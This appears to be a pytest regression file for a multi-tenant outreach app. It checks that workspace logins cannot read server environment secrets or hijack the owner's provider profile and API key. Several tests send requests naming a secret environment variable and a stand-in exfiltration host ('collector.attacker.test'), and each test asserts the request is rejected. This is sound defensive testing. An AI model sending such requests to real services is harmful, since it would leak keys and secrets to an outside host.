"""No login can reach a key it was not given (D-154, D-155).

Keys are typed in the app (DD-64). Two older paths broke that: a draft request
could name any server environment variable and a URL to send it to, and the
install-wide provider profiles let any login re-point the owner's profile at
its own server. Each test acts as a real workspace login through the API.
"""
from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

from offsetx_apollo_builder.api.app import create_app
from offsetx_apollo_builder.outreach import provider_profiles as profiles_module
from test_workspace_isolation import ADMIN_TOKEN, _login, _settings

ADMIN = {"X-Offsetx-Token": ADMIN_TOKEN}
OWNER_KEY = "sk-owner-typed-in-the-app-" + "k" * 20


@pytest.fixture()
def client(tmp_path, monkeypatch):
    monkeypatch.setenv("OFFSETX_PROBE_SECRET", "server-secret-that-must-not-leave")
    with TestClient(create_app(_settings(tmp_path))) as test_client:
        assert test_client.post(
            "/api/v1/workspaces",
            headers=ADMIN,
            json={"username": "beta-user", "workspace_id": "beta", "password": "beta-password-1"},
        ).status_code == 201
        yield test_client


@pytest.fixture()
def built(monkeypatch):
    """Every provider a profile builds, with the environment it was handed."""
    calls: list[tuple[dict, object]] = []

    class Stub:
        def generate(self, **_):
            raise AssertionError("no draft should reach a provider in these tests")

    def fake(config, environ=None):
        calls.append(({"base_url": config.base_url, "api_key_env": config.api_key_env}, environ))
        return Stub()

    monkeypatch.setattr(profiles_module, "create_provider", fake)
    return calls


def _owner_profile(client) -> str:
    saved = client.post(
        "/api/v1/provider-profiles",
        headers=ADMIN,
        json={
            "name": "Owner's OpenAI",
            "provider_type": "openai_compatible",
            "model": "gpt-4o-mini",
            "api_key": OWNER_KEY,
            "base_url": "https://api.openai.com/v1",
        },
    )
    assert saved.status_code == 201, saved.text
    return saved.json()["id"]


def test_a_draft_request_cannot_name_an_environment_variable_or_a_url(client):
    _login(client, "beta")
    campaign = client.post("/api/v1/campaigns", json={"name": "Beta"}).json()["id"]
    answer = client.post(
        f"/api/v1/campaigns/{campaign}/drafts/generate",
        json={
            "campaign_contact_ids": [],
            "stages": ["initial"],
            "provider": {
                "provider_type": "openai_compatible",
                "model": "x",
                "api_key_env": "OFFSETX_PROBE_SECRET",
                "base_url": "https://collector.attacker.test/v1",
            },
        },
    )
    assert answer.status_code == 422


def test_a_profile_cannot_name_an_environment_variable(client):
    answer = client.post(
        "/api/v1/provider-profiles",
        headers=ADMIN,
        json={
            "name": "From the environment",
            "provider_type": "openai_compatible",
            "api_key_env": "OFFSETX_PROBE_SECRET",
            "base_url": "https://collector.attacker.test/v1",
        },
    )
    assert answer.status_code == 422


def test_a_stored_profile_naming_a_variable_never_reads_the_environment(client, built):
    """Profiles saved before this change may still name one."""
    store = client.app.state.provider_profiles
    store.upsert(
        {"owner": "local", "name": "Legacy", "provider_type": "openai_compatible",
         "api_key_env": "OFFSETX_PROBE_SECRET", "base_url": "https://collector.attacker.test/v1"}
    )
    store.router(owner="local")
    assert built, "the router built no provider"
    for _, environ in built:
        assert environ is not None, "handed the server's real environment"
        assert "server-secret-that-must-not-leave" not in dict(environ).values()


def test_a_client_login_sees_none_of_the_owners_profiles(client):
    _owner_profile(client)
    _login(client, "beta")
    assert client.get("/api/v1/provider-profiles").json()["items"] == []


def test_a_client_login_cannot_repoint_test_or_delete_the_owners_profile(client, built):
    profile = _owner_profile(client)
    _login(client, "beta")
    repointed = client.post(
        "/api/v1/provider-profiles",
        json={"id": profile, "name": "Mine now", "provider_type": "openai_compatible",
              "base_url": "https://collector.attacker.test/v1"},
    )
    assert repointed.status_code == 404
    assert client.post(f"/api/v1/provider-profiles/{profile}/test", json={"live_probe": True}).status_code == 404
    assert client.post(f"/api/v1/provider-profiles/{profile}/delete").status_code == 404
    kept = client.app.state.provider_profiles.list()
    assert [item["base_url"] for item in kept] == ["https://api.openai.com/v1"]
    assert not built  # nothing was built, so nothing could be sent


def test_a_client_login_drafts_with_its_own_profiles_only(client, built):
    _owner_profile(client)
    _login(client, "beta")
    campaign = client.post("/api/v1/campaigns", json={"name": "Beta"}).json()["id"]
    client.post(
        f"/api/v1/campaigns/{campaign}/drafts/generate",
        json={"campaign_contact_ids": [], "stages": ["initial"],
              # The owner's profiles carry owner "default" (the form's default).
              "use_provider_fallback": True, "provider_owner": "default"},
    )
    assert not built  # the owner's profile was never assembled for beta


def test_a_client_logins_new_profile_is_its_own(client):
    _login(client, "beta")
    saved = client.post(
        "/api/v1/provider-profiles",
        json={"owner": "local", "name": "Beta's", "provider_type": "openai_compatible",
              "api_key": "sk-beta-" + "b" * 20, "base_url": "https://api.openai.com/v1"},
    )
    assert saved.status_code == 201, saved.text
    assert saved.json()["owner"] == "beta"
